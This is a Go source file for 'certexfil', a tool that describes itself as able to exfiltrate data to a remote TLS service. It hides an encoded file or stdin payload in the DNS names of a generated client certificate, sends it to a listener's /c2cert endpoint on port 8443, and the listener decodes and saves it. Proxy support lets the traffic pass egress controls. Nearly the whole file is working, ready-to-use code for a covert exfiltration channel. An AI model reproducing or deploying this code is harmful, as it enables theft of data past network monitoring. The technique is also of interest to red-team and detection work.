// certexfil provides CA certs and can be used to exfiltrate data to a remote TLS service.
// @Sourcefrenchy
package main

import (
	"bufio"
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"flag"
	"fmt"
	"github.com/sourcefrenchy/cryptopayload"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// tlsPort is used for listener (all interface) on your remote server
var tlsPort = "8443"

var (
	debug      = flag.Bool("debug", false, "Debug mode to print out more information")
	listen     = flag.Bool("listen", false, "Start your TLS listener and wait for payload.")
	host       = flag.String("host", "", "Comma-separated hostnames and IPs to generate a certificate for")
	proxy      = flag.String("proxy", "", "proxy info formatted as http://user:pwd@proxy:port")
	validFrom  = flag.String("start-date", "", "Creation date formatted as Jan 1 15:04:05 2011")
	validFor   = flag.Duration("duration", 365*24*time.Hour, "Duration that certificate is valid for")
	isCA       = flag.Bool("ca", false, "whether this cert should be its own Certificate Authority")
	rsaBits    = flag.Int("rsa-bits", 2048, "Size of RSA key to generate. Ignored if --ecdsa-curve is set")
	ecdsaCurve = flag.String("ecdsa-curve", "P521", "ECDSA curve to use to generate a key. Valid values are P224, P256 (recommended), P384, P521")
	payload    = flag.String("payload", "", "Indicate the file to embed. Use - for stdin.")
	outfile    = flag.Bool("outfile", false, "save payload received to payload.bin")
)

var DEBUG = *debug

func rootHandler(w http.ResponseWriter, r *http.Request) {
	// Write "Oo" to the response body
	if _, err := io.WriteString(w, "Oo"); err != nil {
		log.Fatal(err)
	}
	certs := r.TLS.PeerCertificates

	if len(certs) > 0 {
		if DEBUG {
			log.Printf("[*] Payload received: %s", certs[0].DNSNames[1])
		}
		payload := cryptopayload.Retrieve(certs[0].DNSNames[1])
		if *outfile == true {
			log.Println("[D] outfile = true")
			out, err := os.Create("payload.bin")
			if err != nil {
				// panic?
			}
			defer out.Close()
			bReader := bytes.NewReader([]byte(payload))
			if _, err := io.Copy(out, bReader); err != nil {
				log.Fatal(err)
			}
		}
	}
}

func tlsListen() {
	caCert, err := ioutil.ReadFile("./CERTS/server_cert.pem")
	if err != nil {
		log.Fatal("[!] No certificate in ./CERTS. Generate CA first (e.g. ./certexfil -ca -ecdsa-curve P521 --host remote.host.com), then ensure that both your client and server have a copy of ./CERTS directory and files")
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	// Create the TLS Config with the CA pool and enable Client certificate validation
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		ClientCAs:  caCertPool,
		//      ClientAuth:               tls.RequireAndVerifyClientCert,
		ClientAuth:       tls.RequestClientCert,
		CurvePreferences: []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
	}
	log.Println("[*] Starting listener...")

	// Create a Server instance to listen on port 8443 with the TLS config
	server := &http.Server{
		Addr:         ":" + tlsPort,
		TLSConfig:    tlsConfig,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler), 0),
	}

	// Set up /c2cert resource handler
	http.HandleFunc("/c2cert", rootHandler)
	// Listen to HTTPS connections with the server certificate and wait
	err = server.ListenAndServeTLS("./CERTS/server_cert.pem", "./CERTS/server_key.pem")
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

func publicKey(private interface{}) interface{} {
	switch k := private.(type) {
	case *rsa.PrivateKey:
		return &k.PublicKey
	case *ecdsa.PrivateKey:
		return &k.PublicKey
	default:
		return nil
	}
}

func pemBlockForKey(private interface{}) *pem.Block {
	switch k := private.(type) {
	case *rsa.PrivateKey:
		return &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(k)}
	case *ecdsa.PrivateKey:
		b, err := x509.MarshalECPrivateKey(k)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Unable to marshal ECDSA private key: %v", err)
			os.Exit(2)
		}
		return &pem.Block{Type: "EC PRIVATE KEY", Bytes: b}
	default:
		return nil
	}
}

// tlsConnect main section
func tlsConnect(host string) {
	// Read the key pair to create certificate
	cert, err := tls.LoadX509KeyPair("./CERTS/client_cert.pem", "./CERTS/client_key.pem")
	if err != nil {
		log.Fatal(err)
	}

	// Create a CA certificate pool and add cert.pem to it
	caCert, err := ioutil.ReadFile("./CERTS/server_cert.pem")
	if err != nil {
		log.Fatal(err)
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			RootCAs:      caCertPool,
			Certificates: []tls.Certificate{cert},
		},
	}

	// Create HTTPS client and supply the created CA pool and certificate
	// proxyStr := "http://user:w00tw00t@127.0.0.1:3128"
	if len(*proxy) != 0 {
		u, err := url.Parse(*proxy)
		if err != nil {
			log.Fatal(err)
		} else {
			log.Println("[*] Using proxy settings:", *proxy)
			transport.Proxy = http.ProxyURL(u)
		}
	}

	client := &http.Client{
		Transport: transport,
	}

	// Request /hello via the created HTTPS client over port tlsPort via GET
	r, err := client.Get("https://" + host + ":" + tlsPort + "/c2cert")
	if err != nil {
		fmt.Printf("[!] Proxy issues: \n\t")
		log.Fatal(err)
	}
	r.Body.Close()
}

func main() {
	flag.Parse()

	if *listen == true {
		tlsListen()
	} else {
		var err error
		if len(*host) == 0 {
			log.Fatalf("[!] Missing required --host parameter")
		}
		var private interface{}
		switch *ecdsaCurve {
		case "":
			private, err = rsa.GenerateKey(rand.Reader, *rsaBits)
		case "P224":
			private, err = ecdsa.GenerateKey(elliptic.P224(), rand.Reader)
		case "P256":
			private, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		case "P384":
			private, err = ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
		case "P521":
			private, err = ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
		default:
			fmt.Fprintf(os.Stderr, "[!] Unrecognized elliptic curve: %q", *ecdsaCurve)
			os.Exit(1)
		}
		if err != nil {
			log.Fatalf("[!] failed to generate private key: %s", err)
		}

		if _, err := os.Stat("./CERTS"); os.IsNotExist(err) {
			err = os.Mkdir("./CERTS", 0700)
			if err != nil && !os.IsExist(err) {
				log.Println(err)
			}
		}

		var notBefore time.Time
		if len(*validFrom) == 0 {
			notBefore = time.Now()
		} else {
			notBefore, err = time.Parse("Jan 2 15:04:05 2006", *validFrom)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[!] Failed to parse creation date: %s\n", err)
				os.Exit(1)
			}
		}

		notAfter := notBefore.Add(*validFor)
		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
		if err != nil {
			log.Fatalf("[!] failed to generate serial number: %s", err)
		}

		var payloadDat string
		if *payload == "-" && *isCA == false {
			if DEBUG {
				log.Print("[*] Reading from stdin..")
			}
			reader := bufio.NewReader(os.Stdin)
			payloadDat, _ = reader.ReadString('\n')
			payloadDat = strings.TrimSuffix(payloadDat, "\n")
		} else if *isCA == false {
			// make sure we generated CA file
			_, err = ioutil.ReadFile("./CERTS/server_cert.pem")
			if err != nil {
				log.Fatal("[!] No certificate in ./CERTS. Generate CA first (e.g. ./certexfil -ca -ecdsa-curve P521 --host remote.host.com), then ensure that both your client and server have a copy of ./CERTS directory and files")
			}

			if DEBUG {
				log.Print("[*] Reading from file..")
			}
			buf, err := ioutil.ReadFile(*payload)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[!] Failed to read payload file: %s\n", err)
				os.Exit(1)
			}
			payloadDat = string(buf)
		}

		template := x509.Certificate{
			SerialNumber: serialNumber,
			Subject: pkix.Name{
				Organization: []string{"Acme C0w"},
			},
			NotBefore: notBefore,
			NotAfter:  notAfter,

			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
			BasicConstraintsValid: true,
		}

		template.ExtKeyUsage = append(template.ExtKeyUsage, x509.ExtKeyUsageClientAuth)
		hosts := strings.Split(*host, ",")
		for _, h := range hosts {
			if ip := net.ParseIP(h); ip != nil {
				template.IPAddresses = append(template.IPAddresses, ip)
			} else {
				template.DNSNames = append(template.DNSNames, h)
			}
		}

		// Include obfuscated payload as DNS names
		if *isCA == false {
			// make sure we generated CA file
			_, err = ioutil.ReadFile("./CERTS/server_cert.pem")
			if err != nil {
				log.Fatal("[!] No certificate in ./CERTS. Generate CA first (e.g. ./certexfil -ca -ecdsa-curve P521 --host remote.host.com), then ensure that both your client and server have a copy of ./CERTS directory and files")
			}
			sEnc := cryptopayload.Prepare(payloadDat)
			template.DNSNames = append(template.DNSNames, sEnc)
		}

		// Create CA and save into ./CERT directory
		var certPrefix string
		if *isCA {
			certPrefix = "./CERTS/server_"
			template.IsCA = true
			template.KeyUsage |= x509.KeyUsageCertSign
		} else {
			certPrefix = "./CERTS/client_"
		}

		derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, publicKey(private), private)
		if err != nil {
			log.Fatalf("[!] Failed to create certificate: %s", err)
		}

		certOut, err := os.Create(certPrefix + "cert.pem")
		if err != nil {
			log.Fatalf("[!] failed to open cert.pem for writing: %s", err)
		}
		if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
			log.Fatalf("[!] failed to write data to cert: %s", err)
		}
		if err := certOut.Close(); err != nil {
			log.Fatalf("[!] error closing cert: %s", err)
		}

		log.Print("[*] Generated custom cert with payload\n")

		keyOut, err := os.OpenFile(certPrefix+"key.pem", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
		if err != nil {
			log.Print("[!] failed to open cert key for writing:", err)
			return
		}
		if err := pem.Encode(keyOut, pemBlockForKey(private)); err != nil {
			log.Fatalf("[!] failed to write data to cert key: %s", err)
		}
		if err := keyOut.Close(); err != nil {
			log.Fatalf("[!] error closing cert key: %s", err)
		}

		if *isCA == false {
			tlsConnect(*host)
		}
	}
}
